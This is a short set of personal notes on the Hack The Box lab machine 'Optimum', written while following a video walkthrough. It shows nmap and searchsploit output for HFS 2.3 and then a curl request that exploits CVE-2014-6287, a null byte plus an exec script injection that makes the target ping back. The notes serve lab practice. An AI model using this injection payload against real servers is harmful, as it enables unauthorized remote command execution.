# Optimum 

This is not a proper writeup.

These are my notes while following [IppSec's video](https://www.youtube.com/watch?v=kWTnVBIpNsE).

```
sgs@ptbox:~$ nmap -Pn -sV -sC 10.10.10.8

Starting Nmap 7.60 ( https://nmap.org ) at 2020-03-17 21:17 CET
Nmap scan report for 10.10.10.8
Host is up (0.079s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.98 seconds
```

It's some kind of webserver, it's available at http://10.10.10.8

```
sgs@ptbox:~$ searchsploit HFS 2.3
---------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                              |  Path
                                                                            | (/opt/exploitdb/)
---------------------------------------------------------------------------- ----------------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload              | exploits/multiple/remote/30850.tx
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)         | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)         | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution    | exploits/windows/webapps/34852.tx
---------------------------------------------------------------------------- ----------------------------------
Shellcodes: No Result
Papers: No Result
sgs@ptbox:~$ ^C
````

HFS provides its own [scripting language](https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands).

The vulnerability we are exploiting is CVE-2014-6287 (Remote Command Execution (2)), which allow you to exec arbitrary commands if you pass a null byte at the beginning of a query parameter.

```
sgs@ptbox:~$ sudo tcpdump -ni tun0 icmp

sgs@ptbox:~$ curl "http://10.10.10.8/?search=%00{.exec|ping.exe+10.10.14.20.}"

```



